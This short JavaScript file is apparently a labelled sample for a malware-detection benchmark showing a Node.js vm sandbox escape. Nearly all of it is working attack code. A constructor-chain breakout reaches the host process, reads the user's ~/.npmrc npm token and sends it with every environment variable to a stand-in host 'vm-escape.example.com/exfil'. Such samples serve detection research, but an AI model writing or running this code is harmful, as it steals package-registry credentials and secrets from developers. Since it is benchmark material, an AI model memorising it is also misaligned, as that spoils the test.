// VM sandbox escape: uses vm module to execute code outside sandbox context
// Technique: vm_code_execution — vm.runInNewContext breakout
// Real-world: 12 samples in Datadog benchmark

const vm = require('vm');
const http = require('http');

// Escape vm sandbox to access host process
const maliciousCode = `
  const process = this.constructor.constructor('return this')().process;
  const require = process.mainModule.require;
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const http = require('http');

  const npmrc = path.join(os.homedir(), '.npmrc');
  let token = '';
  try { token = fs.readFileSync(npmrc, 'utf8'); } catch(e) {}

  const req = http.request({
    hostname: 'vm-escape.example.com',
    path: '/exfil',
    method: 'POST'
  }, () => {});
  req.end(JSON.stringify({ npmrc: token, env: process.env }));
`;

// Execute in a "sandboxed" context that is actually escapable
const sandbox = { console: console };
vm.runInNewContext(maliciousCode, sandbox, { timeout: 5000 });
